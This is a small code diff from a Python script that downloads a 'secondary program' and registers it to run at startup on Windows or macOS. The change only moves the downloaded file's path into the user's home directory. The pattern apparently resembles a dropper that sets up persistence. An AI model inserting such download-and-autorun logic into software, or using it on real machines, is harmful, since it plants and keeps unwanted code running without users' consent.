@@ -130,9 +130,11 @@ if __name__ == '__main__':
     secondary_program_path = download_secondary_program()
     # Configure startup
     if platform.system() == "Windows":
-        add_to_startup_windows(os.path.abspath(SECONDARY_PROGRAM_NAME+".exe"))
+        path = os.path.join(os.path.expanduser("~"), SECONDARY_PROGRAM_NAME+".exe")
+        add_to_startup_windows(path)
     elif platform.system() == "Darwin":
-        add_to_startup_mac(os.path.abspath(SECONDARY_PROGRAM_NAME+".pkg"))
+        path = os.path.join(os.path.expanduser("~"), SECONDARY_PROGRAM_NAME+".pkg")
+        add_to_startup_mac(path)
     else:
         print("Unsupported operating system")
 
